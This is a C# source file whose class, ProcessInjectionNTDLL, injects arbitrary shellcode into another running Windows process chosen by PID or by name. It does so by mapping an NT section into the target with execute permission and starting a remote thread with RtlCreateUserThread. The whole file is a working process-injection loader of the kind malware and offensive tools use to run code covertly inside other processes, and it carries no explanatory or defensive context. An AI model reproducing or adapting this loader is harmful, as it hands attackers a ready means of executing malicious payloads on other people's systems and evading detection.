using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

class ProcessInjectionNTDLL
{
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
        processId);
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
            static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref long MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        UIntPtr ZeroBits,
        UIntPtr CommitSize,
        ref long SectionOffset,
        ref long ViewSize,
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
        lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
        dwCreationFlags, IntPtr lpThreadId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();
        public static void InjectToProcessNTDLLByPID(byte[] shellcode, int pid)
        {
            long SIZE = (uint)shellcode.Length;
            long maxSize = SIZE;
            IntPtr sectionHandle = new IntPtr();
            long sectionOffset = 0;
            
            IntPtr localSectionAddress = IntPtr.Zero, remoteSectionAddress = IntPtr.Zero;
            UInt32 createSection = NtCreateSection(ref sectionHandle, (0x0002 | 0x0004 | 0x0008), IntPtr.Zero, ref maxSize, 0x40, 0x8000000, IntPtr.Zero);
            
            uint LocalmapViewOfSection = NtMapViewOfSection(sectionHandle, GetCurrentProcess(), ref localSectionAddress, UIntPtr.Zero, UIntPtr.Zero, ref sectionOffset, ref SIZE, 2, 0, 0x04);

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            uint RemotemapViewOfSection = NtMapViewOfSection(sectionHandle, hProcess, ref remoteSectionAddress, UIntPtr.Zero, UIntPtr.Zero, ref sectionOffset, ref SIZE, 2, 0, 0x20);
            Marshal.Copy(shellcode, 0, localSectionAddress, shellcode.Length);
            IntPtr targetThreadHandle = IntPtr.Zero;
            var res = RtlCreateUserThread(hProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, remoteSectionAddress, IntPtr.Zero, ref targetThreadHandle, IntPtr.Zero);
            //IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteSectionAddress, IntPtr.Zero, 0, IntPtr.Zero);          
        }

    public static int getProcessPIDByName(string name)
    {
        Process[] p = Process.GetProcessesByName(name);
        if (p.Length > 0)
        {
            return p[0].Id;
        }
        return -1;
    }
    public static void InjectToProcessNTDLLByName(byte[] shellcode, string name)
    {
        int pid = getProcessPIDByName(name);
        InjectToProcessNTDLLByPID(shellcode, pid);
    }
}
